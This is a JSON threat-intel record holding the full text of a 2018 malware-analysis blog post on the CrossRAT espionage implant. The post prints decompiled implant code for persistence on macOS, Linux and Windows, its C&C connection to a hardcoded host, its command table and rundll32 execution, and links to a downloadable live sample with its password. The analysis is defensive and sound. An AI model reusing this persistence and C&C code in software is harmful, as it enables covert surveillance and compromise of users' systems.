@@ -1,0 +1,230 @@
+{
+    "id": "0363bccb-ad34-494b-877a-ace51abfdda8",
+    "created_at": "2023-01-12T15:01:20.358008Z",
+    "updated_at": "2025-03-27T02:16:26.237613Z",
+    "deleted_at": null,
+    "sha1_hash": "133236514dcf211f55d62d3a5f3e2df62a3aa91d",
+    "title": "2018-01-24 - Analyzing CrossRAT- A cross-platform implant, utilized in a global cyber-espionage campaign",
+    "authors": "",
+    "file_creation_date": "2022-05-29T01:22:36Z",
+    "file_modification_date": "2022-05-29T01:22:36Z",
+    "file_size": 1901447,
+    "plain_text": "# Objective-See\n\n**objective-see.com/blog/blog_0x28.html**\n\nAnalyzing CrossRAT\n\n› a cross-platform implant, utilized in a global cyber-espionage campaign\n\n1/24/2018\n\n[love these blog posts? support my tools & writing on patreon :)](https://www.patreon.com/objective_see)\n\n[Want to play along? I've shared the malware, which can be downloaded here (password:](https://objective-see.com/downloads/malware/CrossRAT.zip)\ninfect3d).\n\nBackground\n\nI'm on a plane again...this time flying home from one of my favorite hacker cons: [ShmooCon!](http://shmoocon.org/)\nI was stoked to give a talk about auditing on macOS. Yah, I know that doesn't seem like the\nsexiest of topics -but if you're interested in incidence response, malware analysis, or writing\nsecurity tools for macOS, it's a very relevant topic! Plus, the talk covered some neat ring-0\nbugs that affected the audit subsystem including a kernel panic, a kernel information leak,\nand a exploitable kernel heap overflow:\n\n\n-----\n\nBesides being able to speak, the highlight of ShmooCon was meeting tons of new awesome\npeople - some who are in a way directly responsible for this blog. I personally have to thank\n[Kate from Gizmodo (@kateconger), who introduced me to Eva (@evacide) and Cooper](https://twitter.com/kateconger)\n[(@cooperq) from the](https://twitter.com/cooperq) [Electronic Frontier Foundation (EFF). We geeked out about a variety of](https://www.eff.org/)\n[stuff, including their latest reported (produced in conjunction with Lookout):](https://www.lookout.com/) _\"Dark Caracal_\n_Cyber-espionage at a Global Scale\". Their findings about this global nationstate cyber-_\nespionage campaign are rather ominous. From their report:\n\nDark Caracal has been conducting a multi-platform, APT-level surveillance operation\ntargeting individuals and institutions globally.\n\nWe have identified hundreds of gigabytes of data exfiltrated from thousands of victims,\nspanning 21+ countries in North America, Europe, the Middle East, and Asia.\n\nThe mobile component of this APT is one of the first we've seen executing espionage\non a global scale.\n\nDark Caracal targets also include governments, militaries, utilities, financial institutions,\nmanufacturing companies, and defense contractors.\n\nTypes of exfiltrated data include documents, call records, audio recordings, secure\nmessaging client content, contact information, text messages, photos, and account\ndata.\n\n\n-----\n\nDark Caracal follows the typical attack chain for cyber-espionage. They rely primarily\non social media, phishing, and in some cases physical access to compromise target\nsystems, devices, and accounts.\n\nDark Caracal makes extensive use of Windows malware called Bandook RAT. Dark\nCaracal also uses a previously unknown, multiplatform tool that Lookout and EFF have\nnamed CrossRAT, which is able to target Windows, OSX, and Linux.\n\nThe report is an intriguing read and quite thorough. Seriously, go [read it! I was most](https://info.lookout.com/rs/051-ESQ-475/images/Lookout_Dark-Caracal_srr_20180118_us_v.1.0.pdf)\ninterested in \"CrossRAT\", a \"multiplatform tool...able to target Windows, OSX, and Linux\",\nwhich the report did discuss, but not in a ton of technical detail. I'm not complaining at all gave me something interesting to poke on and blog about!\n\nIn this blog post we'll analyze this threat, providing a comprehensive technical overview that\nincludes its persistence mechanisms as well as its capabilities. I want to thank Cooper\n[(@cooperq) for sharing not only a sample of CrossRAT, but also his analysis notes -](https://twitter.com/cooperq)\nespecially related to the C&C protocol. Mahalo dude!!\n\nCrossRAT\nThe EFF/Lookout [report describes CrossRat as a \"newly discovered desktop](https://info.lookout.com/rs/051-ESQ-475/images/Lookout_Dark-Caracal_srr_20180118_us_v.1.0.pdf)\n_surveillanceware tool...which is able to target Windows, OSX, and Linux.\" Of course the OSX_\n(macOS) part intrigues me the most, so this post may have somewhat of a 'Mac-slant.'\n\nThe report provides a good overview of this new threat:\n\n_\"Written in Java with the ability to target Windows, Linux, and OSX, CrossRAT is able to_\n_manipulate the file system, take screenshots, run arbitrary DLLs for secondary infection on_\n_Windows, and gain persistence on the infected system.\"_\n\nA sample, 'hmar6.jar' was submitted to VirusTotal (view [here). Somewhat unsurprisingly (as](https://www.virustotal.com/#/file/15af5bbf3c8d5e5db41fd7c3d722e8b247b40f2da747d5c334f7fd80b715a649/detection)\nis often the case with new malware), it's detection even now is basically none-existent: 1/59\n\n\n-----\n\nThough I'm not fond of Java as a programming language, it is \"decompilable\" - meaning\nmalware written in this language is fairly straightforward to analyze. Tools such as [jad or](https://en.wikipedia.org/wiki/JAD_(software)) \"JDGUI\" can take as input a compiled jar file, and spit out decently readable Java code! And\n[since it's 2018 you can even decompile Java in the cloud! Now if only somebody could](http://www.javadecompilers.com/)\ncombine this with the blockchain...\n\nOpening the malicious .jar file 'hmar6.jar', in JD-GUI reveals the following package layout:\n\nAs a .jar is an archive, one could also just unzip it, then browser the package structure\nmanually. Of course the files in the archive are Java classes containing Java bytecode. Thus\none of the aforementioned Java decompilers should be used.\n\nFor the purpose of this blog post, our goals are to identify and understand the malware's:\n\n\n-----\n\npersistence mechanism (and install location)\n\nC&C communications\n\nfeatures/capabilities\n\nWe'll ultimately discuss the client.class file in the crossrat package, as it contains both the\nmain entry point of the malware (public static void main(String args[])), and it's main logic.\nHowever, let's first start by peaking at the other packages in the jar; 'a', 'b', and 'org'.\n\nThe first package, (which JD-GUI simply names 'a'), appears to be responsible for\ndetermining the OS version of any system it is running on. Since Java can run on multiple\nplatforms, CrossRAT can be deployed on Windows, Linux, SunOS, and OS X (well,\nassuming Java is installed). Of course not all the logic in the implant can be OS-agnostic. For\nexample, persistence (as we'll see) is OS-specific. As such correctly identifying the\nunderlying system is imperative. It's also likely this information is useful to the attackers (i.e.\nfor profiling, metrics, etc).\n\nDumping strings of the a/c.class shows the supported systems that CrossRAT should run on:\n```\n $ strings - CrossRAT/a/c.class\n  LINUX\n  MACOS\n  SOLARIS\n  WINDOWS\n\n```\nJava provides various OS-agnostic methods to detect the type of operating system its\nrunning on. For example, CrossRAT invoke the following:\n```\n System.getProperty(\"os.name\")\n\n```\nThis method will return values such as \"windows\", \"linux\", or \"mac os\".\n\nInterestingly the implant also contains various OS-specific code that aids in the more precise\nOS detection (yes, rather meta). For example code within the a/c/a.class executes\n/usr/bin/sw_vers:\n\n\n-----\n\n```\n  Object localObject new File( /usr/bin/sw_vers );\n  ...\n  Iterator localIterator = (localObject = e.a((File)localObject)).iterator();\n  while (localIterator.hasNext()) {\n   if ((localObject = (String)localIterator.next()).contains(c.b.a())) {\n     return true;\n   }\n  }\n  if (paramBoolean) {\n   return ((localObject =\nSystem.getProperty(\"os.name\").toLowerCase()).contains(\"mac os x\")) \n       || (((String)localObject).contains(\"macos\"));\n  }\n  ...\n\n```\nThe sw_vers binary is Apple-specific, and returns the exact version of OSX/macOS. On my\nbox:\n```\n $ /usr/bin/sw_vers\n  ProductName: Mac OS X\n  ProductVersion: 10.13.2\n  BuildVersion: 17C88\n\n```\nCrossRAT also contains other non-OS agnostic code to determine or gather information\nabout an infected system. For example, in the crossrat/e.class file, we see a call to uname\n(with the -a flag):\n```\n public static String c()\n {\n    String s = null;\n    Object obj = Runtime.getRuntime().exec(new String[] {\"uname\", \"-a\"});\n    s = ((BufferedReader) (obj = new BufferedReader(new\nInputStreamReader(((Process)\n       (obj)).getInputStream())))).readLine();\n    ((BufferedReader) (obj)).close();\n    return s;\n }\n\n```\nThe uname command, when executed with the -a flag will display not only OS version, but\nalso information that identifies the kernel build and architecture (i.e. x86_64):\n```\n $ uname -a\n  Darwin Patricks-MacBook-Pro.local 17.3.0 Darwin Kernel Version 17.3.0: \n  root:xnu-4570.31.3~1/RELEASE_X86_64 x86_64\n\n```\n\n-----\n\nFinally the implant even attempts to query systemd files for (recent/modern) linux-specific\nversion information:\n```\n try\n {\n   obj1 = a(new File(\"/etc/os-release\"), \"=\");\n }\n catch(Exception _ex)\n {\n   System.out.println(\"Failed to load /etc/os-release\");\n }\n try\n {\n   map = a(new File(\"/etc/lsb-release\"), \"=\");\n }\n catch(Exception _ex)\n {\n   System.out.println(\"Failed to load /etc/lsb-release\");\n }\n\n```\nFinally, though absent in the disassembly, running the strings command reveals a large list of\nOS versions that CrossRAT apparently is able to detect (and infect?). Here for example, a\nmyriad of linux versions:\n\n$ strings - a/b/c.class\n\nAlpine Linux Antergos Arch Linux Blag Centos Chakra Chapeau Crunchbang Crux Centos\nChakra Chapeau Crunchbang Crux Debian Deepin Dragora Debian Debian Kali Linux\nDeepin Dragora Elementary_os Evolve_os Evolve Os Evolveos Fedora Frugalware Funtoo\nFedora Frugalware Funtoo Gentoo Gnewsense Gentoo Jiyuu Jiyuu Kali Kaos Kde Neon\nKde_neon Korora Kaos Kali Kali Linux Korora Lmde Lunar La/b/c; Linux Mint Linuxdeepin\nLinuxmint Lunar Lunar Linux Mageia Mandrake Mandriva Manjaro Mint Mageia Mandrake\nMandriva Mandriva Linux Manjaro Manjaro Linux Nixos Nixos Opensuse Oracle_linux Oracle\nLinux Parabola Peppermint Parabola Parabola Gnu/linux-libre Peppermint Qubes Qubes\nRaspbian Redhat_enterprise Raspbian Red Hat Redhatenterprise Redhat Enterprise\nSabayon Scientificlinux Slackware Solusos Steamos Suse Linux Sabayon Scientific Linux\nSlackware Solusos Stackmaptable Steamos Tinycore Trisquel Ubuntu Unknown Ubuntu\nUnknown Unknown Linux Viperr\n\nMoving on, let's take a peak at the next package, which JD-GUI simply names 'b':\n\n\n-----\n\nWonder what this package is responsible for? If you guessed 'persistence' you'd be correct :)\n\nOn an infected system, in order to ensure that the OS automatically (re)executes the\nmalware whenever the system is rebooted, the malware must persist itself. This (generally)\nrequires OS-specific code. That is to say, there are Windows-specific methods of\npersistence, Mac-specific method, Linux-specific methods, etc...\n\nThe b/c.class implements macOS-specific persistence by means of a Launch Agent. First the\n'a' method invokes the 'b' method:\n```\n public final void a()\n {\n   if(!b().exists())\n      b().mkdirs(); \n   ...\n\n```\nLooking at the 'b' method, we can see it returns a launch agent directory. If the user is root, it\nwill return the directory for system launch agents (i.e. /Library/LaunchAgents/) otherwise the\nuser-specific directory will be returned (e.g. /Users/patrick/Library/LaunchAgents/).\n\n\n-----\n\n```\n private static File b()\n {\n    String s = System.getProperty(\"user.home\");\n    if(a.c.b().a() != a.c.a && (new BufferedReader(new InputStreamReader(\nRuntime.getRuntime().exec(\"whoami\").getInputStream()))).readLine().equals(\"root\"))\n    {\n      s = \"\";\n    }\n    return new File((new\nStringBuilder(String.valueOf(s))).append(\"/Library/LaunchAgents/\")\n            .toString());\n }\n\n```\nThe code then creates a launch agent property list (plist):\n```\n ((PrintWriter) (obj = new PrintWriter(new FileWriter(((File) (obj))))))\n         .println(\"<plist version=\\\"1.0\\\">\");\n ((PrintWriter) (obj)).println(\"<dict>\");\n ((PrintWriter) (obj)).println(\"\\t<key>Label</key>\");\n ((PrintWriter) (obj)).println((new StringBuilder(\"\\t<string>\"))\n         .append(super.b).append(\"</string>\").toString());\n ((PrintWriter) (obj)).println(\"\\t<key>ProgramArguments</key>\");\n ((PrintWriter) (obj)).println(\"\\t<array>\");\n if(a)\n {\n   ((PrintWriter) (obj)).println(\"\\t\\t<string>java</string>\");\n   ((PrintWriter) (obj)).println(\"\\t\\t<string>-jar</string>\");\n }\n ((PrintWriter) (obj)).println((new StringBuilder(\"\\t\\t<string>\"))\n         .append(super.c).append(\"</string>\").toString());\n ((PrintWriter) (obj)).println(\"\\t</array>\");\n ((PrintWriter) (obj)).println(\"\\t<key>RunAtLoad</key>\");\n ((PrintWriter) (obj)).println(\"\\t<true/>\");\n ((PrintWriter) (obj)).println(\"</dict>\");\n ((PrintWriter) (obj)).println(\"</plist>\");\n ((PrintWriter) (obj)).close();\n\n```\nAs the RunAtLoad key is set to true, whatever the malware has specified in the\nProgramArguments array will be executed. From the code we can see this is: java -jar\n\n[super.c]. To determine what .jar is persisted (i.e. super.c) we could analyze the decompiled\njava code...or it's simpler to just run the malware, then dump the plist file. We opt for the\nlatter and infect a Mac VM:\n\n\n-----\n\n```\n $ java jar hmar6.jar &\n $ cat ~/Library/LaunchAgents/mediamgrs.plist \n  <plist version=\"1.0\">\n  <dict>\n   <key>Label</key>\n   <string>mediamgrs</string>\n   <key>ProgramArguments</key>\n   <array>\n    <string>java</string>\n    <string>-jar</string>\n    <string>/Users/user/Library/mediamgrs.jar</string>\n   </array>\n   <key>RunAtLoad</key>\n   <true/>\n  </dict>\n  </plist>\n\n```\nAh, so ~/Library/mediamgrs.jar is persisted. If we hash this file with the malicious 'hmar6.jar'\nthat we've been analyzing they match. In other words the malware simply persists itself:\n```\n $ md5 ~/Library/mediamgrs.jar\n MD5 (/Users/user/Library/mediamgrs.jar) = 85b794e080d83a91e904b97769e1e770\n $ md5 hmar6.jar \n MD5 (/Users/user/Desktop/hmar6.jar) = 85b794e080d83a91e904b97769e1e770\n\n```\nMoving on, we can figure out how the malware persists both on Linux and Windows.\n\nLinux persistence is implemented in the b/d.class:\n\n\n-----\n\nAs can be seen in the above screen capture, CrossRAT, the malware persists on Linux by\ncreating an autostart file in the aptly named ~/.config/autostart/ directory (file:\nmediamgrs.desktop). Similar to macOS, it persists itself: Exec=java -jar [this.c] Looking\nelsewhere in the code, we can see the value for 'this.c' will be set to: /usr/var/mediamgrs.jar\nat runtime:\n```\n else\n {\n   k.K = \"/usr/var/\";\n }\n paramArrayOfString = new File(k.K + \"mediamgrs.jar\");\n\n```\nFor more information on persisting a file on Linux using this 'autostart' technique, see: \"How\nTo Autostart A Program In Raspberry Pi Or Linux?\".\n\nOf course CrossRAT also contains logic to persist on Windows machines. This persistence\ncode can be found in the b/e.class:\n\n\n-----\n\n```\n public final void a()\n {\n   String s;\n   if(a)\n   {\n     s = (new StringBuilder(String.valueOf(System.getProperty(\"java.home\"))))\n     .append(\"\\\\bin\\\\javaw.exe\").toString();\n     s = (new StringBuilder(String.valueOf(s))).append(\" -jar \\\"\")\n     .append(c).append(\"\\\"\").toString();\n   } else\n   {\n     s = super.c;\n   }\n   Runtime.getRuntime().exec(new String[] {\n     \"reg\", \"add\", \"HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\\\\\", \n            \"/v\", super.b, \"/t\", \"REG_SZ\", \"/d\", s, \"/f\"\n   });\n }\n\n```\nAh the good old CurrentVersion\\Run registry key. A rather lame Windows persistence\ntechnique, but hey, it will persist the malware's .jar file ensuring it's (re)executed each time an\ninfected system is rebooted.\n\nWith a decent understanding of both the 'a' package (OS detection) and the 'b' package\n(persistence), let's discuss the 'org' package. Then, finally(!), we'll dive into the malware's\ncore logic.\n\nThe 'org' package contains packages named'a.a.a.' and 'jnativehook'.\n\n\n-----\n\nLooking at various classes within the a.a.a package, we can see this package contains code\ndealing with file i/o operations. For example take a look at some of the strings from the\n'a.a.a/b.class':\n```\n $ strings - strings - src/org/a/a/a/b.class\n does not exist\n is not a directory\n to a subdirectory of itself \n already exists\n cannot be written to\n directory cannot be created\n does not exist\n exists but is a directory\n exists but is read-only\n Cannot move directory: \n Destination must not be null\n Failed to copy full contents from\n Failed to delete original directory\n Failed to list contents of \n File does not exist: \n Unable to delete file:\n\n```\nPretty clear that this is the part of the implant that allows a remote attacker the ability to\ninteract with and modify the file system on an infected system.\n\nWant to confirm this in code? Let's take a look at the 'a' method in the same 'a.a.a/b.class'.\nThis method will copy a file, taking in an optional parameter to 'match' the file modification of\nthe destination file to its source. Hey, that'd pretty neat!\n\n\n-----\n\n```\n private static void a(File paramFile1, File paramFile2, boolean paramBoolean)\n {\n  if ((paramFile2.exists()) && (paramFile2.isDirectory())) {\n   throw new IOException(\"Destination '\" + paramFile2 + \"' exists but is a\ndirectory\");\n  }\n  ....\n  try\n  {\n   localFileInputStream = new FileInputStream(paramFile1);\n   localFileOutputStream = new FileOutputStream(paramFile2);\n   localFileChannel1 = localFileInputStream.getChannel();\n   localFileChannel2 = localFileOutputStream.getChannel();\n   l1 = localFileChannel1.size();\n   long l5;\n   for (l2 = 0L; l2 < l1; l2 += l5)\n   {\n    long l4;\n    long l3 = (l4 = l1 - l2) > 31457280L ? 31457280L : l4;\n    if ((l5 = localFileChannel2.transferFrom(localFileChannel1, l2, l3)) == 0L) {\n     break;\n    }\n   }\n   ...\n  }\n  ....\n  long l1 = paramFile1.length();\n  long l2 = paramFile2.length();\n  if (l1 != l2) {\n   throw new IOException(\"Failed to copy full contents from '\" + paramFile1 + \"'\nto '\" + \n               paramFile2 + \"' Expected length: \" + l1 + \" Actual: \" +\nl2);\n  }\n  if(paramBoolean) {\n   paramFile2.setLastModified(paramFile1.lastModified());\n  }\n }\n\n```\nThe other package in the 'org' package is named 'jnativehook'. If you google this, you'll\n[discover its an open-source Java library. Check out its github page: jnativehook.](https://github.com/kwhat/jnativehook)\n\nAs described by its author, it was created to \"provide global keyboard and mouse listeners\n_for Java\". This functionality is not possible in (high-level) Java code, thus the library_\nleverages \"platform dependent native code...to create low-level system-wide hooks and\n_deliver those events to your application.\" Hrmm why would a cyber-espionage implant be_\ninterested in such capabilities? Capturing key-events (i.e. keylogging) would be an obvious\nanswer! However, I didn't see any code within that implant that referenced the 'jnativehook'\n\n\n-----\n\npackage - so at this point it appears that this functionality is not leveraged? There may be a\ngood explanation for this. As noted in the report, the malware identifies it's version as 0.1,\nperhaps indicating it's still a work in progress and thus not feature complete.\n\nOk, time to dive into the core logic of CrossRat!\n\nThe main logic of the malware is implemented within the crossrat/client.class file. In fact this\nclass contains the main entry point of the implant (public static void main(String args[])):\n```\n grep -R main hmar6.jar/*\n crossrat/client.jad:  public static void main(String args[])\n\n```\nWhen the malware is executed this main method is invoked. This performs the following\nsteps:\n\n1. If necessary, performs an OS-specific persistent install\n\n2. Checks in with the remote command and control (C&C) server\n\n3. Performs any tasking as specified by the C&C server\n\nLet's take a closer look at all of this!\n\nThe malware first installs itself persistently. As previously discussed, this logic is OS-specific\nand involves the malware copying itself to a persistent location (as mediamgrs.jar), before\nsetting persistence (registry key, launch agent plist, etc). I've inserted comments into the\nfollowing code, to illustrate these exact steps. Below, we first have the code the builds the\npath to the OS-specific install directory:\n\n\n-----\n\n```\n public static void main(String args[])\n {\n   Object obj;\n   supportedSystems = c.b();\n   String tempDirectory;\n   //get temp directory\n   s = System.getProperty(s = \"java.io.tmpdir\");\n   installDir = \"\";\n   //Windows?\n   // build path to Windows install directory (temp directory)\n   if(supportedSystems.a() == c.a)\n   {\n     installDir = (new StringBuilder(String.valueOf(s)))\n            .append(\"\\\\\").toString();\n   }\n   //Mac?\n   // build path to Mac install directory (~/Library)\n   else if(supportedSystems.a() == c.b)\n   {\n     userHome = System.getProperty(\"user.home\");\n     installDir = (new StringBuilder(String.valueOf(userHome)))\n            .append(\"/Library/\").toString();\n   } \n   //Linux, etc?\n   // build path to Linux, etc install directory (/usr/var/)\n   else\n   {\n     installDir = \"/usr/var/\";\n   }\n   ...\n\n```\nOnce path to the install directory has been dynamically created, the malware makes a copy\nof itself (mediamgrs.jar) into the install directory:\n```\n public static void main(String args[])\n {\n  ...\n  //build full path and instantiate file obj\n  installFileObj = new File(installDir + \"mediamgrs.jar\");\n  //copy self to persistent location\n  org.a.a.a.b.a(((File) (selfAsFile)), installFileObj);\n  ...\n\n```\n\n-----\n\nVia the fs_usage command, we can observe this file copy, and updating of the file time to\nmatch to original:\n```\n # fs_usage -w -f filesystem\n open    F=7  (R_____) /Users/user/Desktop/hmar6.jar java.125131\n lseek   F=7  O=0x00000000 java.125131\n open    F=8  (_WC_T_) /Users/user/Library/mediamgrs.jar java.125131\n pwrite   F=8  B=0x3654f  O=0x00000000 java.125131\n close   F=8  0.000138 java.125131\n utimes   /Users/user/Library/mediamgrs.jar java.125131\n # ls -lart /Users/user/Library/mediamgrs.jar\n -rw-r--r-- 1 user staff 222543 Jan 22 18:54 /Users/user/Library/mediamgrs.jar\n # ls -lart ~/Desktop/hmar6.jar \n -rw-r--r-- 1 user wheel 222543 Jan 22 18:54 /Users/user/Desktop/hmar6.jar\n\n```\nOnce the malware has made a copy of itself, it execute the OS-specific logic to persist. As\nwe're executing the malware on a Mac VM, the malware will persist as a launch agent:\n```\n public static void main(String args[])\n {\n  ...\n  //persist: Windows\n  if ((localObject5 = a.c.b()).a() == a.c.a) {\n   paramArrayOfString = new b.e(paramArrayOfString, (String)localObject4, true);\n  } \n  //persist: Mac\n  else if (((a.a)localObject5).a() == a.c.b) {\n   paramArrayOfString = new b.c(paramArrayOfString, (String)localObject4, true);\n  } \n  //persist: Linux\n  else if ((((a.a)localObject5).d()) && \n(!GraphicsEnvironment.getLocalGraphicsEnvironment().isHeadlessInstance())) {\n   paramArrayOfString = new b.d(paramArrayOfString, (String)localObject4, true);\n  } \n  ...\n  //error: unknown OS\n  else {\n   throw new RuntimeException(\"Unknown operating system \" +\n((a.a)localObject5).c());\n  }\n  ...\n\n```\n[We can again observe this persistence by monitoring the file system, or BlockBlock detects](https://objective-see.com/products/blockblock.html)\nthis persistence attempt:\n\n\n-----\n\nNow the malware has persistently installed itself, it checks in with the C&C server for tasking.\nAs noted the EFF/Lookout [report the malware will connect to flexberry.com on port 2223.](https://info.lookout.com/rs/051-ESQ-475/images/Lookout_Dark-Caracal_srr_20180118_us_v.1.0.pdf)\n\nThis C&C info is hardcoded in the crossrat/k.class file:\n```\n public static void main(String args[])\n {\n   ...\n   //connect to C&C server\n   Socket socket;\n   (socket = new Socket(crossrat.k.b, crossrat.k.c)).setSoTimeout(0x1d4c0);\n   ...\n\n```\n\n-----\n\nWhen the malware checks in with the C&C server for tasking, it will transmit various\ninformation about the infected host, such as version and name of the operating system, host\nname, and user name. The generation of this information is shown in code below:\n```\n public static void main(String args[])\n {\n  ...\n  if((k.g = (k.h = Preferences.userRoot()).get(\"UID\", null)) == null)\n  {\n    k.g = (k.f = UUID.randomUUID()).toString();\n    k.h.put(\"UID\", k.g);\n  }\n  String s1 = System.getProperty(\"os.name\");\n  String s2 = System.getProperty(\"os.version\");\n  args = System.getProperty(\"user.name\");\n  Object obj1;\n  obj1 = ((InetAddress) (obj1 = InetAddress.getLocalHost())).getHostName();\n  obj1 = (new StringBuilder(String.valueOf(args))).append(\"^\")\n      .append(((String) (obj1))).toString();\n  ...\n\n```\nThe malware then parses the response from the C&C server and if tasking is found acts on\nit.\n\nIf you made it this far, I'm sure you're wondering what the malware can actual do! That is to\n[say, what's it's capabilities? its features? Lucky for us, the EFF/Lookout report provides some](https://info.lookout.com/rs/051-ESQ-475/images/Lookout_Dark-Caracal_srr_20180118_us_v.1.0.pdf)\ndetails. Below are annotations from their report of the crossrat/k.class which contains\nCrossRat's tasking values:\n```\n  // Server command prefixes\n  public static String m = \"@0000\"; // Enumerate root directories on the system. 0\nargs\n  public static String n = \"@0001\"; // Enumerate files on the system. 1 arg\n  public static String o = \"@0002\"; // Create blank file on system. 1 arg\n  public static String p = \"@0003\"; // Copy File. 2 args\n  public static String q = \"@0004\"; // Move file. 2 args\n  public static String r = \"@0005\"; // Write file contents. 4 args\n  public static String s = \"@0006\"; // Read file contents. 4 args\n  public static String t = \"@0007\"; // Heartbeat request. 0 args\n  public static String u = \"@0008\"; // Get screenshot. 0 args\n  public static String v = \"@0009\"; // Run a DLL 1 arg\n\n```\nThe code that uses these value can be found in the crossrat/client.class file, where, as we\nmentioned, the malware parses and acts upon the response from the C&C server:\n\n\n-----\n\n```\n public static void main(String args[])\n {\n  ...\n  //enum root directories\n  if((args1 = args.split((new StringBuilder(\"\\\\\"))\n    .append(crossrat.k.d).toString()))[0].equals(k.m))\n  {\n    new crossrat.e();\n    crossrat.e.a();\n    f f1;\n    (f1 = new f()).start();\n  } \n  //enum files\n  else if(args1[0].equals(k.n))\n    (args = new crossrat.c(args1[1])).start();\n  //create blank file\n  else if(args1[0].equals(k.o))\n    (args = new crossrat.a(args1[1])).start();\n  //copy file\n  else if(args1[0].equals(k.p))\n    (args = new crossrat.b(args1[1], args1[2])).start();\n   ...\n\n```\nLet's look at some of the more 'interesting' commands such as the screen capture and dll\nloading.\n\nWhen the malware receives the string \"0008\" ('k.u') from the C&C server is instantiates and\n'runs' a 'j' object, passing in 'k.b' and 'k.c':\n```\n public static void main(String args[])\n {\n  ...\n  //C&C server addr\n  public static String b = \"flexberry.com\";\n  //C&C server port\n  public static int c = 2223;\n  //handle cmd: 0008\n  // pass in C&C addr/port\n  else if(args1[0].equals(k.u))\n   (args = new j(crossrat.k.b, crossrat.k.c)).start();\n  ...\n\n```\n\n-----\n\nThe 'j' object is defined in the crossrat/j.class file:\n\nVia the java.awt.Robot().createScreenCapture the malware performs a screen capture,\ntemporarily saves it as a disk (as a .jpg with a randomized name), before exfiltrating it to the\nC&C server.\n\nAnother interesting command is \"0009\". When the malware receives this command it\ninstantiates a kicks off an 'i'. This object is implemented in the crossrat/i.class file:\n\n\n-----\n\nWhen the malware is executing on a Window machine, it will execute invoke rundll32 to load\nurl.dll and invoke it's FileProtocolHandler method:\n```\n  //open a file\n  Runtime.getRuntime().exec(new String[] {\n      \"rundll32\", \"url.dll,FileProtocolHandler\", file.getAbsolutePath()\n  });\n\n```\nThe url.dll is a legitimate Microsoft library which can be (ab)used to launch executable on an\ninfected system. For example, on Windows, the following will launch Calculator:\n```\n  //execute a binary\n  Runtime.getRuntime().exec(new String[] {\n      \"rundll32\", \"url.dll,FileProtocolHandler\", \"calc.exe\"\n  });\n\n```\nOn systems other than Windows, it appears that the \"0009\" command will execute the\nspecified file via the Desktop.getDesktop().open() method.\n```\n //execute a binary\n else if ((locala.a() == c.b) || (locala.a() == c.c)) {\n try\n {\n  Desktop.getDesktop().open(localFile);\n }\n\n```\nConclusions\n\nIn this blog post we provided an in-depth technical analysis of the newly discovered cross\n\n-----\n\nplatform cyber-espionage implant CrossRAT. Thought not particularly sophisticated version\n0.1 of this malware is still fairly feature-complete and able to run on a large number of\nplatforms. Moreover, as noted by the EFF/Lookout the attackers utilizing CrossRAT seem to\nbe both (decently) competent, motivated, and successful.\n\nLet's end with a few FAQs!\n\nQ: How does one get infected by CrossRAT?\nA: In their report, the EFF/Lookout, note: \"[the attackers] rely primarily on social media,\n_phishing, and in some cases physical access to compromise target systems, devices, and_\n_accounts.\"_\n\nQ: How can I protect myself from an infection?\nA: As CrossRAT is written in Java, it requires Java to be installed. Luckily recent versions of\nmacOS do not ship with Java. Thus, most macOS users should be safe! Of course if a Mac\nuser already has Java installed, or the attacker is able to coerce a naive user to install Java\nfirst, CrossRAT will run just dandy, even on the latest version of macOS (High Sierra).\n\nIt is also worth noting that currently AV detections seem rather non-existent (1/59 on Virus\nTotal). Thus having anti-virus software installed likely won't prevent or detect a CrossRAT\ninfection. However tools that instead detect suspicious behaviors, such as persistence, can\nhelp!\n\nFor example [BlockBlock easily detects CrossRAT when it attempts to persist:](https://objective-see.com/products/blockblock.html)\n\nQ: How can I tell if I'm infected with CrossRAT?\n\nA: First check to see if there is an instance of Java is running, that's executing\nmediamgrs.jar.\n\nOn macOS or Linux use the 'ps' command:\n\n\n-----\n\n```\n  $ ps aux | grep mediamgrs.jar\n  user 01:51AM /usr/bin/java -jar /Users/user/Library/mediamgrs.jar\n\n```\nOne can also look for the persistent artifacts of the malware. However, as the malware\npersists in an OS-specific manner, detecting this will depend what OS you're running.\n\nWindows:\nCheck the HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\ registry key. If\ninfected it will contain a command that includes, java, -jar and mediamgrs.jar.\n\nMac:\nCheck for jar file, mediamgrs.jar, in ~/Library.\n\nAlso look for launch agent in /Library/LaunchAgents or ~/Library/LaunchAgents named\nmediamgrs.plist.\n\nLinux:\nCheck for jar file, mediamgrs.jar, in /usr/var.\n\nAlso look for an 'autostart' file in the ~/.config/autostart likely named\nmediamgrs.desktop.\n\nQ: On an infected system, what can CrossRAT do?\nA:CrossRAT allows an remote attacker complete control over an infected system. Some of\nit's persistent capabilities include:\n\nfile upload/download/create/delete\n\nscreen capture\n\nrun arbitrary executables\n\nWell that wraps up our blog on CrossRAT! Mahalo for reading :)\n\n[love these blog posts & tools? you can support them via patreon! Mahalo :)](https://www.patreon.com/objective_see)\n\n© 2018 objective-see llc\n\n\n-----",
+    "language": "EN",
+    "sources": [
+        {
+            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
+            "created_at": "2023-01-12T14:38:44.599904Z",
+            "updated_at": "2023-01-12T14:38:44.599904Z",
+            "deleted_at": null,
+            "name": "VXUG",
+            "url": "https://www.vx-underground.org",
+            "description": "vx-underground Papers",
+            "reports": null
+        }
+    ],
+    "references": [
+        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2018/2018-01-24 - Analyzing CrossRAT- A cross-platform implant, utilized in a global cyber-espionage campaign.pdf"
+    ],
+    "report_names": [
+        "2018-01-24 - Analyzing CrossRAT- A cross-platform implant, utilized in a global cyber-espionage campaign.pdf"
+    ],
+    "threat_actors": [
+        {
+            "id": "ce10c1bd-4467-45f9-af83-28fc88e35ca4",
+            "created_at": "2022-10-25T15:50:23.458833Z",
+            "updated_at": "2025-03-27T02:00:55.475188Z",
+            "deleted_at": null,
+            "main_name": "APT34",
+            "aliases": null,
+            "source_name": "MITRE:APT34",
+            "tools": [
+                "netstat",
+                "Systeminfo",
+                "PsExec",
+                "SEASHARPEE",
+                "Tasklist",
+                "Mimikatz",
+                "POWRUNER",
+                "certutil"
+            ],
+            "source_id": "MITRE",
+            "reports": null
+        },
+        {
+            "id": "af704c54-a580-4c29-95f2-82db06fbb6f9",
+            "created_at": "2022-10-25T16:07:23.525064Z",
+            "updated_at": "2025-03-27T02:02:09.845137Z",
+            "deleted_at": null,
+            "main_name": "Dark Caracal",
+            "aliases": [
+                "ATK 27",
+                "Operation Dark Caracal",
